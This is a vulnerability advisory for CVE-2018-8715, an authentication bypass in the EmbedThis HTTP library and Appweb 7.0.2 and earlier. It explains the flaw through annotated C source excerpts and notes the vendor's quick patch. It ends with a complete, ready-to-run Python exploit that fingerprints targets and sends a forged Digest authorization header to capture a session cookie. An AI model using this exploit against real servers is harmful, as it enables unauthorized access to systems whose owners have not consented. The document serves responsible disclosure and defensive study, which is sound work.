**Vulnerability Summary**<br>
A critical vulnerability in the EmbedThis HTTP library, and Appweb versions 5.5.x, 6.x, and 7.x including the latest version present in the git repository.

In detail, due to a logic flaw, with a forged HTTP request it is possible to bypass the authentication for HTTP basic and HTTP digest login types.

**Confirmed Vulnerable**<br>
Appweb version 7.0.2 and prior

**Credit**<br>
An independent security researcher, Davide Quarta (@_ocean) and Truel IT, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Vendor Response**<br>
Vendor response was exceptionally quick, within 2 days from reporting the vulnerability to them they had a patch available and new version Appweb version 7.0.3 and information available to the public: https://github.com/embedthis/appweb/issues/610

**CVE**<br>
CVE-2018-8715

**Vulnerability Details**<br>
Due to a logical flaw in the authentication procedure, knowing the target username, it is possible to completely bypass authentication of both form and digest type authentications, by means of a crafted HTTP POST request.
File `http/httpLib.c` – function `authCondition()``

This function is responsible for calling the two functions that are responsible of authentication: `getCredentials`, and `httpLogin`. Notice the lack of checks around `httpGetCredentials`, it will be useful later.

```c
14559 static int authCondition(HttpConn *conn, HttpRoute *route, HttpRouteOp *op)
14560 {
14561 HttpAuth *auth;
14562 cchar *username, *password;
14563
14564 assert(conn);
14565 assert(route);
14566
14567 auth = route->auth;
14568 if (!auth || !auth->type) {
14569 /* Authentication not required */
14570 return HTTP_ROUTE_OK;
14571 }
14572 if (!httpIsAuthenticated(conn)) {
14573 httpGetCredentials(conn, &username, &password);
14574 if (!httpLogin(conn, username, password)) {
14575 if (!conn->tx->finalized) {
14576 if (auth && auth->type) {
14577 (auth->type->askLogin)(conn);
14578 } else {
14579 httpError(conn, HTTP_CODE_UNAUTHORIZED, "Access Denied, login required");
14580 }
14581 /* Request has been denied and a response generated. So OK to accept this route. */
14582 }
14583 return HTTP_ROUTE_OK;
14584 }
14585 }
14586 if (!httpCanUser(conn, NULL)) {
14587 httpTrace(conn, "auth.check", "error", "msg:'Access denied, user is not authorized for access'");
14588 if (!conn->tx->finalized) {
14589 httpError(conn, HTTP_CODE_FORBIDDEN, "Access denied. User is not authorized for access.");
14590 /* Request has been denied and a response generated. So OK to accept this route. */
14591 }
14592 }
14593 /* OK to accept route. This does not mean the request was authenticated - an error may have been already generated */
14594 return HTTP_ROUTE_OK;
14595 }
```

File `http/httpLib.c` – function `httpGetCredentials()`

This function receives two pointers to char arrays that will contain the username and password parsed from the request. Since there are no checks in authCondition, it doesn’t matter if the “parseAuth” function fail, this means we can insert in the WWW-Authenticate header or in the post data for authentication any field we want:

```c
1640 /*
1641 Get the username and password credentials. If using an in-protocol auth scheme like basic|digest, the
1642 rx->authDetails will contain the credentials and the parseAuth callback will be invoked to parse.
1643 Otherwise, it is expected that "username" and "password" fields are present in the request parameters.
1644
1645 This is called by authCondition which thereafter calls httpLogin
1646 */
1647 PUBLIC bool httpGetCredentials(HttpConn *conn, cchar **username, cchar **password)
1648 {
1649 HttpAuth *auth;
1650
1651 assert(username);
1652 assert(password);
1653 *username = *password = NULL;
1654
1655 auth = conn->rx->route->auth;
1656 if (!auth || !auth->type) {
1657 return 0;
1658 }
1659 if (auth->type) {
1660 if (conn->authType && !smatch(conn->authType, auth->type->name)) {
1661 if (!(smatch(auth->type->name, "form") && conn->rx->flags & HTTP_POST)) {
1662 /* If a posted form authentication, ignore any basic|digest details in request */
1663 return 0;
1664 }
1665 }
1666 if (auth->type->parseAuth && (auth->type->parseAuth)(conn, username, password) < 0) {
1667 return 0;
1668 }
1669 } else {
1670 *username = httpGetParam(conn, "username", 0);
1671 *password = httpGetParam(conn, "password", 0);
1672 }
1673 return 1;
1674 }
```

File `http/httpLib.c` – function `httpLogin()`

This function will check for the username to be not null, when there is already a session associated, the password pointer can instead be null.

```c
1686 PUBLIC bool httpLogin(HttpConn *conn, cchar *username, cchar *password)
1687 {
1688 HttpRx *rx;
1689 HttpAuth *auth;
1690 HttpSession *session;
1691 HttpVerifyUser verifyUser;
1692
1693 rx = conn->rx;
1694 auth = rx->route->auth;
1695 if (!username || !*username) {
1696 httpTrace(conn, "auth.login.error", "error", "msg:'missing username'");
1697 return 0;
1698 }
1699 if (!auth->store) {
1700 mprLog("error http auth", 0, "No AuthStore defined");
1701 return 0;
1702 }
1703 if ((verifyUser = auth->verifyUser) == 0) {
1704 if (!auth->parent || (verifyUser = auth->parent->verifyUser) == 0) {
1705 verifyUser = auth->store->verifyUser;
1706 }
1707 }
1708 if (!verifyUser) {
1709 mprLog("error http auth", 0, "No user verification routine defined on route %s", rx->route->pattern);
1710 return 0;
1711 }
1712 if (auth->username && *auth->username) {
1713 /* If using auto-login, replace the username */
1714 username = auth->username;
1715 password = 0;
1716 }
1717 if (!(verifyUser)(conn, username, password)) {
1718 return 0;
1719 }
1720 if (!(auth->flags & HTTP_AUTH_NO_SESSION) && !auth->store->noSession) {
1721 if ((session = httpCreateSession(conn)) == 0) {
1722 /* Too many sessions */
1723 return 0;
1724 }
1725 httpSetSessionVar(conn, HTTP_SESSION_USERNAME, username);
1726 httpSetSessionVar(conn, HTTP_SESSION_IP, conn->ip);
1727 }
1728 rx->authenticated = 1;
1729 rx->authenticateProbed = 1;
1730 conn->username = sclone(username);
1731 conn->encoded = 0;
1732 return 1;
1733 }
<em>File http/httpLib.c – function configVerfiyUser()</em>
The following function will first check for the presence of a valid user, either because it was already set in the session, or because it was passed, since we are able to pass a null password (line 2031), we can bypass the actual checks and successfully authenticate reaching line 2055.
2014 /*
2015 Verify the user password for the "config" store based on the users defined via configuration directives.
2016 Password may be NULL only if using auto-login.
2017 */
2018 static bool configVerifyUser(HttpConn *conn, cchar *username, cchar *password)
2019 {
2020 HttpRx *rx;
2021 HttpAuth *auth;
2022 bool success;
2023 char *requiredPassword;
2024
2025 rx = conn->rx;
2026 auth = rx->route->auth;
2027 if (!conn->user && (conn->user = mprLookupKey(auth->userCache, username)) == 0) {
2028 httpTrace(conn, "auth.login.error", "error", "msg: 'Unknown user', username:'%s'", username);
2029 return 0;
2030 }
2031 if (password) {
2032 if (auth->realm == 0 || *auth->realm == '\0') {
2033 mprLog("error http auth", 0, "No AuthRealm defined");
2034 }
2035 requiredPassword = (rx->passwordDigest) ? rx->passwordDigest : conn->user->password;
2036 if (sncmp(requiredPassword, "BF", 2) == 0 && slen(requiredPassword) > 4 && isdigit(requiredPassword[2]) &&
2037 requiredPassword[3] == ':') {
2038 /* Blowifsh */
2039 success = mprCheckPassword(sfmt("%s:%s:%s", username, auth->realm, password), conn->user->password);
2040
2041 } else {
2042 if (!conn->encoded) {
2043 password = mprGetMD5(sfmt("%s:%s:%s", username, auth->realm, password));
2044 conn->encoded = 1;
2045 }
2046 success = smatch(password, requiredPassword);
2047 }
2048 if (success) {
2049 httpTrace(conn, "auth.login.authenticated", "context", "msg:'User authenticated', username:'%s'", username);
2050 } else {
2051 httpTrace(conn, "auth.login.error", "error", "msg:'Password failed to authenticate', username:'%s'", username);
2052 }
2053 return success;
2054 }
2055 return 1;
2056 }
```

To be able to bypass the authentication we need to be able to pass a null password pointer, fortunately, both for form and digest authentication, the functions used to parse authentication details (line 1666) will allow us to set a null password pointer, and even with an error returned, in the end, it won’t be checked by authCondition, allowing us to completely bypass authentication, the only condition to exploit this is to know a username in the hashmap.
To overcome this limitation, it must be considered that the size of the hashmap is usually small, and the hash algorithm (FNV) used in the hashmap is weak: with a limited number of tries it could be possible to find a collision, and login without knowing a valid username (untested).

**Exploit**<br>
```python
import sys
import requests
import argparse
print """----------------------------------------------------------------
Embedthis Appweb/Http Zero-Day Form/Digest Authentication Bypass
----------------------------------------------------------------
"""
def test_digest(r):
    auth = ["realm", "domain", "qop", "nonce", "opaque", "algorithm", "stale", "MD5", "FALSE", "Digest"]
    wwwauthenticate = r.headers.get('WWW-Authenticate')
    if wwwauthenticate is None:
        return False
    for k in auth:
        if k not in wwwauthenticate:
            return False
    return True
def test_form(r):
    """ extremely shoddy recognition, expect false positives """
    auth = [("X-XSS-Protection", "1; mode=block"), ("X-Content-Type-Options", "nosniff"), ("ETag", None), ("Date", None)]
    potential_auth = [("Last Modified", ""), ("X-Frame-Options", "SAMEORIGIN"), ("Accept-Ranges", "bytes"), ("Content-Type", "text/html")]
    if r.headers.get("WWW-Authenticate") is not None:
        return False
    for k, v in auth:
        rv = r.headers.get(k)
        if not rv:
            return False
        if v is not None and v != rv:
            return False
    potential_count = 0
    for k, v in potential_auth:
        rv = r.headers.get(k)
        if rv and v != "" and v == rv:
            potential_count += 1
    print "[+] Optional matchings: {}/{}".format(potential_count, len(potential_auth))
    return True
def test(url):
    """ Newer EmbedThis HTTP Library/Appweb versions do not advertise their presence in headers, sometimes might be proxied by nginx/apache, we can only look for a default headers configuration """
    r = requests.get(url)
    # EmbedThis GoAhead uses a similar headers configuration, let's skip it explicitly
    serv = r.headers.get("Server")
    if serv and "GoAhead" in serv:
        return False
    if test_digest(r):
        return "digest"
    elif test_form(r):
        return "form"
    return None
def exploit(url, username="joshua", authtype="digest"):
    payload = { "username": username }
    headers = {
        "authorization": "Digest username={}".format(username),
        "user-agent": "TruelBot",
        "content-type": "application/x-www-form-urlencoded",
    }
    if authtype == "digest":
        r = requests.get(url, data=payload, headers=headers)
    else:
        r = requests.post(url, data=payload, headers=headers)
	print(r.content)
    if r.status_code != 200 or len(r.cookies) < 1:
        print "[!] Exploit failed, HTTP status code {}".format(r.status_code)
        return
    print "[*] Succesfully exploited, here's your c00kie:\n  {}".format(dict(r.cookies))
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Test&Exploit EmbedThis form/digest authentication bypass (CVE-XXXX-YYYY)")
    parser.add_argument('-t', '--target', required=True, help="specify the target url (i.e., http(s)://target-url[:port]/)")
    parser.add_argument('-u', '--user', required=True, help="you need to know a valid user name")
    parser.add_argument('-c', '--check', action='store_true', default=False, help="test for exploitability without running the actual exploit")
    parser.add_argument('-f', '--force', action='store_true', default=False, help="skip exploitability test")
    args = parser.parse_args()
    url = args.target
    username = args.user
    t = "form" # default will try form/post
    if args.check or not args.force:
        t = test(url)
    if t is None:
        print "[!] Target does not appear to be Appweb/Embedthis HTTP with form/post auth (force with -f)"
    else:
        print "[+] Potential appweb/embedthis http, {} method".format(t)
    if not args.check:
        print "[!] Exploiting {}, user {}!".format(url, username)
        exploit(url, username, t)
```
